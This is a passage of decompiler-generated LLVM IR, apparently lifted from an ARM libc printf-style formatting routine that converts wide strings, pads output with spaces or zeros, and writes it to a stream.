  %v8_14c68 = call i32 @_fpmaxtostr(i32 %v0_14c60, double bitcast (i64 sext (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -104376) to i64) to double), i32 %v2_14c64, i32 %v5_14c64, i32 %v2_14df8, i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -104376))
  store i32 %v8_14c68, i32* %r0.global-to-local, align 4
  %v1_14c6c = icmp slt i32 %v8_14c68, 0
  br i1 %v1_14c6c, label %dec_label_pc_14fa0, label %dec_label_pc_14c74

dec_label_pc_14c74:                               ; preds = %dec_label_pc_14c4c
  %v2_14c78 = add i32 %v8_14c68, %v1_14e78
  store i32 %v2_14c78, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14f8c

dec_label_pc_14c84:                               ; preds = %dec_label_pc_14c44
  br i1 %v3_14c88, label %dec_label_pc_14d0c, label %dec_label_pc_14c8c

dec_label_pc_14c8c:                               ; preds = %dec_label_pc_14c84
  store i32 0, i32* @sl, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v3_14c94 = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_14c94, i32* %r0.global-to-local, align 4
  br i1 %v7_14c84, label %dec_label_pc_14c9c, label %dec_label_pc_14cd4

dec_label_pc_14c9c:                               ; preds = %dec_label_pc_14c8c
  %v1_14c9c = inttoptr i32 %v3_14c94 to i32*
  %v2_14c9c = load i32, i32* %v1_14c9c, align 4
  %v9_14ca0 = icmp eq i32 %v2_14c9c, 0
  store i32 %v2_14c9c, i32* %stack_var_-44, align 4
  br i1 %v9_14ca0, label %dec_label_pc_14d4c, label %dec_label_pc_14cac

dec_label_pc_14cac:                               ; preds = %dec_label_pc_14c9c
  %v3_14cac = load i32, i32* %stack_var_-348, align 4
  store i32 %v2_14cb0, i32* @r0, align 4
  %v4_14cb4 = ashr i32 %v3_14cac, 31
  %v5_14cb4 = or i32 %v4_14cb4, %v3_14cac
  store i32 %v5_14cb4, i32* %r2.global-to-local, align 4
  store i32 %v2_14cb0, i32* @r1, align 4
  %v6_14cc0 = call i32 @__GI_wcsrtombs(i32 %v2_14cb0, i32 %v2_14cb0, i32 %v5_14cb4, i32 %v2_14cbc, i32 0, i32 %v2_14c9c)
  store i32 %v6_14cc0, i32* %r0.global-to-local, align 4
  %v3_14cc4 = icmp eq i32 %v6_14cc0, -1
  store i32 %v6_14cc0, i32* @r5, align 4
  br i1 %v3_14cc4, label %dec_label_pc_14fa0, label %dec_label_pc_14e38

dec_label_pc_14cd4:                               ; preds = %dec_label_pc_14c8c
  store i32 %v2_14db4, i32* %r7.global-to-local, align 4
  %v1_14cd8 = inttoptr i32 %v3_14c94 to i32*
  %v2_14cd8 = load i32, i32* %v1_14cd8, align 4
  store i32 %v2_14cbc, i32* %r2.global-to-local, align 4
  store i32 %v2_14db4, i32* %r0.global-to-local, align 4
  %v5_14ce4 = call i32 @__GI_wcrtomb(i32 %v2_14db4, i32 %v2_14cd8, i32 %v2_14cbc, i32 %tmp105, i32 0)
  store i32 %v5_14ce4, i32* %r0.global-to-local, align 4
  %v7_14ce8 = icmp eq i32 %v5_14ce4, -1
  store i32 %v5_14ce4, i32* @r5, align 4
  br i1 %v7_14ce8, label %dec_label_pc_14fa0, label %dec_label_pc_14cf4

dec_label_pc_14cf4:                               ; preds = %dec_label_pc_14cd4
  %v0_14cf4 = load i32, i32* @sl, align 4
  store i32 %v0_14cf4, i32* @r8, align 4
  store i32 %v2_14db4, i32* @r4, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  %v1_14d04 = trunc i32 %v0_14cf4 to i8
  %v2_14d04 = load i32, i32* %r7.global-to-local, align 4
  %v4_14d04 = add i32 %v2_14d04, %v5_14ce4
  %v5_14d04 = inttoptr i32 %v4_14d04 to i8*
  store i8 %v1_14d04, i8* %v5_14d04, align 1
  %v0_14e4c.pre.pre = load i32, i32* @r8, align 4
  %v1_14e4c.pre.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14e48thread-pre-split

dec_label_pc_14d0c:                               ; preds = %dec_label_pc_14c84
  br i1 %v3_14d10, label %dec_label_pc_14da8, label %dec_label_pc_14d14

dec_label_pc_14d14:                               ; preds = %dec_label_pc_14d0c
  %v3_14d14 = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_14d14, i32* %r0.global-to-local, align 4
  %v1_14d1c = inttoptr i32 %v3_14d14 to i32*
  %v2_14d1c = load i32, i32* %v1_14d1c, align 4
  br i1 %v7_14d0c, label %dec_label_pc_14d1c, label %dec_label_pc_14d80

dec_label_pc_14d1c:                               ; preds = %dec_label_pc_14d14
  store i32 %v2_14d1c, i32* @r4, align 4
  %v2_14d20 = icmp eq i32 %v2_14d1c, 0
  br i1 %v2_14d20, label %dec_label_pc_14d4c, label %dec_label_pc_14d28

dec_label_pc_14d28:                               ; preds = %dec_label_pc_14d1c, %dec_label_pc_14db0
  %v0_14d2c = phi i32 [ %v2_14d1c, %dec_label_pc_14d1c ], [ %v3_14dc0, %dec_label_pc_14db0 ]
  %v3_14d28 = load i32, i32* %stack_var_-348, align 4
  store i32 %v0_14d2c, i32* %r0.global-to-local, align 4
  %v4_14d30 = ashr i32 %v3_14d28, 31
  %v5_14d30 = or i32 %v4_14d30, %v3_14d28
  %v2_14d34 = inttoptr i32 %v0_14d2c to i8*
  %v3_14d34 = call i32 @strnlen(i8* %v2_14d34, i32 %v5_14d30)
  store i32 %v3_14d34, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  store i32 %v3_14d34, i32* @r5, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_14e48

dec_label_pc_14d4c:                               ; preds = %dec_label_pc_14d1c, %dec_label_pc_14c9c
  %v3_14d4c = load i32, i32* %stack_var_-348, align 4
  %v1_14d50 = icmp slt i32 %v3_14d4c, 0
  br i1 %v1_14d50, label %dec_label_pc_14d68, label %dec_label_pc_14d58

dec_label_pc_14d58:                               ; preds = %dec_label_pc_14d4c
  %tmp212 = icmp ult i32 %v3_14d4c, 6
  br i1 %tmp212, label %dec_label_pc_14d70, label %dec_label_pc_14d68

dec_label_pc_14d68:                               ; preds = %dec_label_pc_14d58, %dec_label_pc_14d4c
  br label %dec_label_pc_14d70

dec_label_pc_14d70:                               ; preds = %dec_label_pc_14d58, %dec_label_pc_14d68
  %storemerge97 = phi i32 [ 6, %dec_label_pc_14d68 ], [ 0, %dec_label_pc_14d58 ]
  store i32 %storemerge97, i32* @r5, align 4
  store i32 0, i32* @r8, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -37632), i32* @r4, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_14e48

dec_label_pc_14d80:                               ; preds = %dec_label_pc_14d14
  store i32 %v2_14d1c, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  store i32 1, i32* @r5, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v2_14db4, i32* @r4, align 4
  store i32 %v2_14d1c, i32* %stack_var_-200, align 4
  br label %dec_label_pc_14e48thread-pre-split

dec_label_pc_14da8:                               ; preds = %dec_label_pc_14d0c
  br i1 %v7_14da8, label %dec_label_pc_14db0, label %dec_label_pc_14dcc

dec_label_pc_14db0:                               ; preds = %dec_label_pc_14da8
  %v0_14db0 = call i32 @__GI___errno_location()
  store i32 %v0_14db0, i32* %r0.global-to-local, align 4
  %v1_14db8 = inttoptr i32 %v0_14db0 to i32*
  %v2_14db8 = load i32, i32* %v1_14db8, align 4
  store i32 %v2_14db8, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  %v3_14dc0 = call i32 @__GI___glibc_strerror_r(i32 %v2_14db8, i32 %v2_14db4, i32 128)
  store i32 %v3_14dc0, i32* %r0.global-to-local, align 4
  store i32 %v3_14dc0, i32* @r4, align 4
  br label %dec_label_pc_14d28

dec_label_pc_14dcc:                               ; preds = %dec_label_pc_14da8
  %v4_14dd4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 908) to i32*), align 4
  %v1_14ddc = add i32 %v4_14dd4, 10
  store i32 %v1_14ddc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14de0

dec_label_pc_14de0:                               ; preds = %dec_label_pc_14e28, %dec_label_pc_14dcc
  %v1_14df0 = phi i32 [ %v1_14e28, %dec_label_pc_14e28 ], [ %v4_14dd4, %dec_label_pc_14dcc ]
  %v1_14de0 = inttoptr i32 %v1_14df0 to i8*
  %v2_14de0 = load i8, i8* %v1_14de0, align 1
  %v3_14de0 = zext i8 %v2_14de0 to i32
  store i32 %v3_14de0, i32* %r2.global-to-local, align 4
  %v9_14de8 = icmp eq i32 %v3_14de0, %tmp99
  br i1 %v9_14de8, label %dec_label_pc_14df0, label %dec_label_pc_14e28

dec_label_pc_14df0:                               ; preds = %dec_label_pc_14de0
  %v2_14df0 = sub i32 %v1_14df0, %v4_14dd4
  %v0_14df4 = load i32, i32* @fp, align 4
  store i32 %v0_14df4, i32* %r0.global-to-local, align 4
  store i32 %v2_14dfc, i32* %r2.global-to-local, align 4
  %v4_14e04 = mul i32 %v2_14df0, 4
  %v5_14e04 = add i32 %v4_14e04, add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 26448)
  %v6_14e04 = inttoptr i32 %v5_14e04 to i32*
  %v7_14e04 = load i32, i32* %v6_14e04, align 4
  store i32 %v7_14e04, i32* @ip, align 4
  store i32 85520, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_14e04)
  %v0_14e10 = load i32, i32* %r0.global-to-local, align 4
  %v1_14e10 = icmp slt i32 %v0_14e10, 0
  br i1 %v1_14e10, label %dec_label_pc_14fa0, label %dec_label_pc_14e18

dec_label_pc_14e18:                               ; preds = %dec_label_pc_14df0
  %v2_14e1c = add i32 %v0_14e10, %v1_14e78
  br label %dec_label_pc_14f8c

dec_label_pc_14e28:                               ; preds = %dec_label_pc_14de0
  %v1_14e28 = add i32 %v1_14df0, 1
  %v3_14e2c = icmp ult i32 %v1_14e28, %v1_14ddc
  br i1 %v3_14e2c, label %dec_label_pc_14de0, label %dec_label_pc_14fa0

dec_label_pc_14e38:                               ; preds = %dec_label_pc_14cac
  %v0_14e38 = load i32, i32* @sl, align 4
  store i32 %v0_14e38, i32* @r8, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v0_14e38, i32* @r4, align 4
  br label %dec_label_pc_14e48

dec_label_pc_14e48thread-pre-split:               ; preds = %.thread85, %dec_label_pc_14c3c, %dec_label_pc_14cf4, %dec_label_pc_14d80
  %v1_14e4c.pre = phi i32 [ %v1_14e4c.pre205, %dec_label_pc_14c3c ], [ %v1_14e4c.pre.pre, %dec_label_pc_14cf4 ], [ 1, %dec_label_pc_14d80 ], [ %v2_14bbc, %.thread85 ]
  %v0_14e4c.pre = phi i32 [ 0, %dec_label_pc_14c3c ], [ %v0_14e4c.pre.pre, %dec_label_pc_14cf4 ], [ 0, %dec_label_pc_14d80 ], [ %v2_14c30, %.thread85 ]
  %stack_var_-336.3.ph = phi i32 [ %v0_14bb0, %dec_label_pc_14c3c ], [ %v0_14ae0, %dec_label_pc_14cf4 ], [ %v0_14ae0, %dec_label_pc_14d80 ], [ %v0_14bb0, %.thread85 ]
  %v0_14e48.pr = load i32, i32* @r6, align 4
  br label %dec_label_pc_14e48

dec_label_pc_14e48:                               ; preds = %dec_label_pc_14e48thread-pre-split, %dec_label_pc_14d70, %dec_label_pc_14d28, %dec_label_pc_14e38
  %v1_14e4c = phi i32 [ %v1_14e4c.pre, %dec_label_pc_14e48thread-pre-split ], [ %storemerge97, %dec_label_pc_14d70 ], [ %v3_14d34, %dec_label_pc_14d28 ], [ %v6_14cc0, %dec_label_pc_14e38 ]
  %v0_14e4c = phi i32 [ %v0_14e4c.pre, %dec_label_pc_14e48thread-pre-split ], [ 0, %dec_label_pc_14d70 ], [ 0, %dec_label_pc_14d28 ], [ %v0_14e38, %dec_label_pc_14e38 ]
  %v0_14e54 = phi i32 [ %v0_14e48.pr, %dec_label_pc_14e48thread-pre-split ], [ 11, %dec_label_pc_14d70 ], [ 11, %dec_label_pc_14d28 ], [ 11, %dec_label_pc_14e38 ]
  %v0_14e94 = phi i32 [ %stack_var_-336.3.ph, %dec_label_pc_14e48thread-pre-split ], [ %v0_14ae0, %dec_label_pc_14d70 ], [ %v0_14ae0, %dec_label_pc_14d28 ], [ %v0_14ae0, %dec_label_pc_14e38 ]
  %v7_14e48 = icmp eq i32 %v0_14e54, 11
  %v2_14e4c = add i32 %v1_14e4c, %v0_14e4c
  br i1 %v7_14e48, label %dec_label_pc_14e64, label %bb173

bb173:                                            ; preds = %dec_label_pc_14e48
  %v7_14e5c = icmp sgt i32 %v0_14e54, 5
  %. = select i1 %v7_14e5c, i32 2, i32 1
  %v2_14e60 = add i32 %v2_14e4c, %.
  br label %dec_label_pc_14e64

dec_label_pc_14e64:                               ; preds = %dec_label_pc_14e48, %bb173
  %v0_14e78 = phi i32 [ %v2_14e4c, %dec_label_pc_14e48 ], [ %v2_14e60, %bb173 ]
  store i32 %tmp98, i32* %r2.global-to-local, align 4
  %v3_14e68 = icmp uge i32 %tmp98, %v0_14e78
  %v9_14e68 = icmp eq i32 %tmp98, %v0_14e78
  %v2_14e6c = xor i1 %v9_14e68, true
  %v3_14e6c = and i1 %v3_14e68, %v2_14e6c
  br i1 %v3_14e6c, label %bb174, label %bb175

bb174:                                            ; preds = %dec_label_pc_14e64
  %v2_14e68 = sub i32 %tmp98, %v0_14e78
  store i32 %v2_14e68, i32* @sl, align 4
  br label %bb175

bb175:                                            ; preds = %dec_label_pc_14e64, %bb174
  store i32 %v1_14e78, i32* %r2.global-to-local, align 4
  %v2_14e74 = xor i1 %v3_14e68, true
  %v3_14e74 = or i1 %v9_14e68, %v2_14e74
  br i1 %v3_14e74, label %bb176, label %._crit_edge

._crit_edge:                                      ; preds = %bb175
  %v1_14e7c.pre = load i32, i32* @sl, align 4
  br label %bb177

bb176:                                            ; preds = %bb175
  store i32 0, i32* @sl, align 4
  br label %bb177

bb177:                                            ; preds = %._crit_edge, %bb176
  %v2_14e8c = phi i32 [ %v1_14e7c.pre, %._crit_edge ], [ 0, %bb176 ]
  %v2_14e78 = add i32 %v0_14e78, %v1_14e78
  %v2_14e7c = add i32 %v2_14e78, %v2_14e8c
  %v0_14e88 = load i32, i32* @sb, align 4
  %v7_14e88 = icmp eq i32 %v0_14e88, 48
  br i1 %v7_14e88, label %bb178, label %.thread30

bb178:                                            ; preds = %bb177
  %v3_14e8c = add i32 %v2_14e8c, %v0_14e4c
  store i32 %v3_14e8c, i32* @r8, align 4
  store i32 0, i32* @sl, align 4
  br label %.thread30

.thread30:                                        ; preds = %bb177, %bb178
  %v0_14ea4 = phi i32 [ %v2_14e8c, %bb177 ], [ 0, %bb178 ]
  %v1_14e94 = and i32 %v0_14e94, 8
  store i32 %v1_14e94, i32* @r7, align 4
  %v2_14e94 = icmp eq i32 %v1_14e94, 0
  br i1 %v2_14e94, label %dec_label_pc_14e9c, label %dec_label_pc_14eb8

dec_label_pc_14e9c:                               ; preds = %.thread30
  %v0_14e9c = load i32, i32* @fp, align 4
  store i32 %v0_14e9c, i32* %r0.global-to-local, align 4
  store i32 %v0_14ea4, i32* %r2.global-to-local, align 4
  %v4_14ea8 = call i32 @_charpad(i32 %v0_14e9c, i8 32, i32 %v0_14ea4)
  store i32 %v4_14ea8, i32* %r0.global-to-local, align 4
  %v1_14eac = load i32, i32* @sl, align 4
  %v9_14eac = icmp eq i32 %v4_14ea8, %v1_14eac
  br i1 %v9_14eac, label %dec_label_pc_14eb4, label %dec_label_pc_14fa0

dec_label_pc_14eb4:                               ; preds = %dec_label_pc_14e9c
  %v0_14eb4 = load i32, i32* @r7, align 4
  store i32 %v0_14eb4, i32* @sl, align 4
  %v0_14ec0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_14eb8

dec_label_pc_14eb8:                               ; preds = %.thread30, %dec_label_pc_14eb4
  %v0_14ec0 = phi i32 [ %v0_14e54, %.thread30 ], [ %v0_14ec0.pre, %dec_label_pc_14eb4 ]
  %v0_14ebc = load i32, i32* @fp, align 4
  %v2_14ec0 = add i32 %v0_14ec0, add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -37624)
  store i32 %v2_14ec0, i32* %r0.global-to-local, align 4
  %v2_14ec4 = inttoptr i32 %v2_14ec0 to i8*
  %v3_14ec4 = call i32 @__GI_fputs_unlocked(i8* %v2_14ec4, i32 %v0_14ebc)
  %v0_14ec8 = load i32, i32* @fp, align 4
  store i32 %v0_14ec8, i32* %r0.global-to-local, align 4
  %v0_14ed0 = load i32, i32* @r8, align 4
  store i32 %v0_14ed0, i32* %r2.global-to-local, align 4
  %v4_14ed4 = call i32 @_charpad(i32 %v0_14ec8, i8 48, i32 %v0_14ed0)
  store i32 %v4_14ed4, i32* %r0.global-to-local, align 4
  %v1_14ed8 = load i32, i32* @r8, align 4
  %v9_14ed8 = icmp eq i32 %v4_14ed4, %v1_14ed8
  br i1 %v9_14ed8, label %dec_label_pc_14ee0, label %dec_label_pc_14fa0

dec_label_pc_14ee0:                               ; preds = %dec_label_pc_14eb8
  %v3_14ee0 = load i32, i32* %stack_var_-44, align 4
  %v2_14ee4 = icmp eq i32 %v3_14ee0, 0
  br i1 %v2_14ee4, label %dec_label_pc_14eec, label %dec_label_pc_14f10

dec_label_pc_14eec:                               ; preds = %dec_label_pc_14ee0
  %v0_14eec = load i32, i32* @r5, align 4
  %v2_14eec = icmp eq i32 %v0_14eec, 0
  br i1 %v2_14eec, label %dec_label_pc_14f74, label %dec_label_pc_14ef4

dec_label_pc_14ef4:                               ; preds = %dec_label_pc_14eec
  %v0_14ef4 = load i32, i32* @r4, align 4
  store i32 %v0_14ef4, i32* %r0.global-to-local, align 4
  %v0_14efc = load i32, i32* @fp, align 4
  store i32 %v0_14efc, i32* %r2.global-to-local, align 4
  %v3_14f00 = inttoptr i32 %v0_14efc to i16*
  %v4_14f00 = call i32 @__stdio_fwrite(i32 %v0_14ef4, i32 %v0_14eec, i16* %v3_14f00)
  store i32 %v4_14f00, i32* %r0.global-to-local, align 4
  %v1_14f04 = load i32, i32* @r5, align 4
  %v9_14f04 = icmp eq i32 %v4_14f00, %v1_14f04
  br i1 %v9_14f04, label %dec_label_pc_14f74, label %dec_label_pc_14fa0

dec_label_pc_14f10:                               ; preds = %dec_label_pc_14ee0
  store i32 %v2_14db4, i32* @r6, align 4
  store i32 %v2_14cb0, i32* @r8, align 4
  store i32 %v2_14cbc, i32* @r7, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v0_14f60.pr = load i32, i32* @r5, align 4
  %v2_14f6041 = icmp eq i32 %v0_14f60.pr, 0
  store i32 %v2_14cb0, i32* @r1, align 4
  store i32 %v2_14db4, i32* @r0, align 4
  br i1 %v2_14f6041, label %dec_label_pc_14f74, label %dec_label_pc_14f28

dec_label_pc_14f28:                               ; preds = %dec_label_pc_14f10, %dec_label_pc_14f5c
  %v1_14f2c = phi i32 [ %v2_14f5c, %dec_label_pc_14f5c ], [ %v0_14f60.pr, %dec_label_pc_14f10 ]
  %v2_14f28 = icmp ult i32 %v1_14f2c, 128
  %.v1_14f2c = select i1 %v2_14f28, i32 %v1_14f2c, i32 128
  store i32 %.v1_14f2c, i32* %r2.global-to-local, align 4
  %v6_14f34 = call i32 @__GI_wcsrtombs(i32 %v2_14db4, i32 %v2_14cb0, i32 %.v1_14f2c, i32 %v2_14cbc, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_14f34, i32* @r4, align 4
  %v2_14f38 = icmp eq i32 %v6_14f34, 0
  store i32 %v6_14f34, i32* %r0.global-to-local, align 4
  br i1 %v2_14f38, label %dec_label_pc_14f5c, label %dec_label_pc_14f44

dec_label_pc_14f44:                               ; preds = %dec_label_pc_14f28
  store i32 %v2_14db4, i32* %r0.global-to-local, align 4
  %v0_14f4c = load i32, i32* @fp, align 4
  store i32 %v0_14f4c, i32* %r2.global-to-local, align 4
  %v3_14f50 = inttoptr i32 %v0_14f4c to i16*
  %v4_14f50 = call i32 @__stdio_fwrite(i32 %v2_14db4, i32 %v6_14f34, i16* %v3_14f50)
  store i32 %v4_14f50, i32* %r0.global-to-local, align 4
  %v1_14f54 = load i32, i32* @r4, align 4
  %v9_14f54 = icmp eq i32 %v4_14f50, %v1_14f54
  br i1 %v9_14f54, label %dec_label_pc_14f5c, label %dec_label_pc_14fa0

dec_label_pc_14f5c:                               ; preds = %dec_label_pc_14f44, %dec_label_pc_14f28
  %v0_14f5c = phi i32 [ %v4_14f50, %dec_label_pc_14f44 ], [ 0, %dec_label_pc_14f28 ]
  %v1_14f5c = load i32, i32* @r5, align 4
  %v2_14f5c = sub i32 %v1_14f5c, %v0_14f5c
  store i32 %v2_14f5c, i32* @r5, align 4
  %v2_14f60 = icmp eq i32 %v2_14f5c, 0
  store i32 %v2_14cb0, i32* @r1, align 4
  store i32 %v2_14db4, i32* @r0, align 4
  br i1 %v2_14f60, label %dec_label_pc_14f74, label %dec_label_pc_14f28

dec_label_pc_14f74:                               ; preds = %dec_label_pc_14f5c, %dec_label_pc_14f10, %dec_label_pc_14ef4, %dec_label_pc_14eec
  %v0_14f74 = load i32, i32* @fp, align 4
  store i32 %v0_14f74, i32* %r0.global-to-local, align 4
  %v0_14f7c = load i32, i32* @sl, align 4
  store i32 %v0_14f7c, i32* %r2.global-to-local, align 4
  %v4_14f80 = call i32 @_charpad(i32 %v0_14f74, i8 32, i32 %v0_14f7c)
  store i32 %v4_14f80, i32* %r0.global-to-local, align 4
  %v1_14f84 = load i32, i32* @sl, align 4
  %v9_14f84 = icmp eq i32 %v4_14f80, %v1_14f84
  br i1 %v9_14f84, label %dec_label_pc_14f8c, label %dec_label_pc_14fa0

dec_label_pc_14f8c:                               ; preds = %dec_label_pc_14f74, %dec_label_pc_14e18, %dec_label_pc_14c74, %dec_label_pc_14a84
  %stack_var_-336.4 = phi i32 [ %v0_14ae0, %dec_label_pc_14a84 ], [ %v0_14e94, %dec_label_pc_14f74 ], [ %v0_14ae0, %dec_label_pc_14e18 ], [ %v0_14ae0, %dec_label_pc_14c74 ]
  %stack_var_-356.3 = phi i32 [ %v1_14e78, %dec_label_pc_14a84 ], [ %v2_14e7c, %dec_label_pc_14f74 ], [ %v2_14e1c, %dec_label_pc_14e18 ], [ %v2_14c78, %dec_label_pc_14c74 ]
  %v3_14f8c = load i32, i32* %stack_var_-352, align 4
  store i32 %v3_14f8c, i32* @r4, align 4
  store i32 %v3_14f8c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_149ac.outer

dec_label_pc_14f98:                               ; preds = %dec_label_pc_14a08
  %v1_14f98 = add i32 %v0_14a10, 2
  store i32 %v1_14f98, i32* @r4, align 4
  br label %dec_label_pc_149ac.outer36

dec_label_pc_14fa0:                               ; preds = %dec_label_pc_14e28, %dec_label_pc_14cac, %dec_label_pc_14f74, %dec_label_pc_14ef4, %dec_label_pc_14eb8, %dec_label_pc_14e9c, %dec_label_pc_14df0, %dec_label_pc_14cd4, %dec_label_pc_14c4c, %bb142, %dec_label_pc_14f44
  store i32 -1, i32* @ip, align 4
  br label %dec_label_pc_14fa8

dec_label_pc_14fa8:                               ; preds = %dec_label_pc_149fc, %bb, %dec_label_pc_14940, %dec_label_pc_14fa0
  %stack_var_-356.4 = phi i32 [ -1, %bb ], [ -1, %dec_label_pc_14940 ], [ -1, %dec_label_pc_14fa0 ], [ %v1_14e78, %dec_label_pc_149fc ]
  store i32 %stack_var_-356.4, i32* %r0.global-to-local, align 4
  store i32 %v6_148f0, i32* @r5, align 4
  store i32 %v9_148f0, i32* @r6, align 4
  store i32 %v12_148f0, i32* @r7, align 4
  store i32 %v18_148f0, i32* @sb, align 4
  store i32 %v21_148f0, i32* @sl, align 4
  store i32 %v24_148f0, i32* @fp, align 4
  ret i32 %stack_var_-356.4

; uselistorder directives
  uselistorder i32 %stack_var_-356.4, { 1, 0 }
  uselistorder i32 %v1_14f98, { 1, 0 }
  uselistorder i32 %v3_14f8c, { 1, 2, 0 }
  uselistorder i32 %v2_14f5c, { 1, 2, 0 }
  uselistorder i32 %v0_14ea4, { 1, 0 }
  uselistorder i32 %v2_14e8c, { 2, 0, 1 }
  uselistorder i1 %v9_14e68, { 1, 0 }
  uselistorder i32 %v2_14e4c, { 1, 0 }
  uselistorder i32 %v0_14e94, { 1, 0 }
  uselistorder i32 %v0_14e4c, { 1, 0 }
  uselistorder i32 %v1_14e28, { 1, 0 }
  uselistorder i32 %v1_14df0, { 1, 0, 2 }
  uselistorder i32 %v3_14dc0, { 1, 2, 0 }
  uselistorder i32 %v0_14d2c, { 1, 0 }
  uselistorder i32 %v2_14d1c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v5_14ce4, { 1, 2, 0, 3 }
  uselistorder i32 %v3_14c5c, { 1, 0 }
  uselistorder i32 %v2_14bbc, { 2, 3, 0, 4, 5, 1, 6 }
  uselistorder i32 %v0_14bd8, { 1, 2, 3, 0 }
  uselistorder i32 %v2_14b58, { 2, 1, 0, 3, 4, 7, 5, 6 }
  uselistorder i32 %v4_14ac0, { 0, 2, 1, 3 }
  uselistorder i32 %v1_14a64.pre, { 1, 0, 2 }
  uselistorder i32 %v1_14a5c, { 1, 0 }
  uselistorder i32 %v1_14a08, { 0, 1, 3, 2 }
  uselistorder i32 %v1_14e78, { 0, 8, 1, 7, 2, 3, 6, 5, 4, 9, 10 }
  uselistorder i32 %v2_149c8, { 1, 0 }
  uselistorder i32 %v1_149c0.lcssa, { 1, 0 }
  uselistorder i8 %v2_149ac, { 1, 0 }
  uselistorder i32 %v2_149c0, { 0, 2, 3, 1 }
  uselistorder i32 %stack_var_-356.1.ph37, { 1, 0 }
  uselistorder i32 %v5_149d8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_14ae0, { 6, 4, 3, 15, 14, 5, 0, 1, 13, 12, 11, 7, 10, 8, 2, 9 }
  uselistorder i1 %v7_14bd0, { 1, 0 }
  uselistorder i1 %v7_14b20, { 1, 2, 0 }
  uselistorder i1 %v7_14d0c, { 1, 0 }
  uselistorder i1 %v7_14c84, { 1, 0 }
  uselistorder i1 %v7_14b60, { 1, 0 }
  uselistorder i32 %v2_14cbc, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_14cb0, { 1, 2, 3, 0, 6, 4, 5, 7 }
  uselistorder i32 %v2_14db4, { 1, 2, 3, 4, 5, 0, 11, 10, 9, 7, 8, 6 }
  uselistorder i32 %v2_14a60, { 1, 3, 2, 0 }
  uselistorder i32 %v4_14a3c, { 1, 0 }
  uselistorder i32 %v2_148f8, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32* %stack_var_-352, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32 %tmp105, { 1, 2, 0 }
  uselistorder i32 %tmp104, { 12, 8, 9, 0, 10, 11, 3, 4, 5, 6, 7, 1, 2, 15, 14, 13 }
  uselistorder i32 %tmp98, { 3, 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 4, 5, 6, 21, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 22, 23, 24, 26, 25, 3, 27, 28, 29, 30, 31, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 8, 6, 7, 10, 9, 11, 13, 12, 18, 14, 15, 16, 17, 19, 20, 23, 21, 22, 25, 24, 27, 26, 29, 28, 31, 30, 34, 32, 33, 37, 38, 35, 36, 39, 40, 2, 1, 42, 41, 44, 43, 46, 45, 48, 47, 0 }
  uselistorder i32 (i32, i8, i32)* @_charpad, { 1, 2, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -104376), { 1, 0 }
  uselistorder label %dec_label_pc_14fa8, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_14fa0, { 2, 10, 3, 4, 5, 0, 6, 7, 1, 8, 9 }
  uselistorder label %dec_label_pc_14f28, { 1, 0 }
  uselistorder label %dec_label_pc_14eb8, { 1, 0 }
  uselistorder label %.thread30, { 1, 0 }
  uselistorder label %bb177, { 1, 0 }
  uselistorder label %bb175, { 1, 0 }
  uselistorder label %dec_label_pc_14e64, { 1, 0 }
  uselistorder label %dec_label_pc_14e48, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_14e48thread-pre-split, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_14d70, { 1, 0 }
  uselistorder label %dec_label_pc_14d28, { 1, 0 }
  uselistorder label %dec_label_pc_14c3c, { 0, 2, 1 }
  uselistorder label %bb171, { 1, 0 }
  uselistorder label %bb169, { 4, 1, 2, 0, 3 }
  uselistorder label %bb166, { 1, 0 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %bb162, { 1, 0 }
  uselistorder label %bb160, { 4, 3, 1, 0, 2 }
  uselistorder label %bb157, { 1, 0 }
  uselistorder label %dec_label_pc_14b10, { 1, 0 }
  uselistorder label %dec_label_pc_14b0c, { 2, 1, 0 }
  uselistorder label %bb151, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14a58, { 1, 0 }
  uselistorder label %bb146, { 1, 0 }
  uselistorder label %dec_label_pc_149fc, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %dec_label_pc_149c8, { 1, 0, 2 }
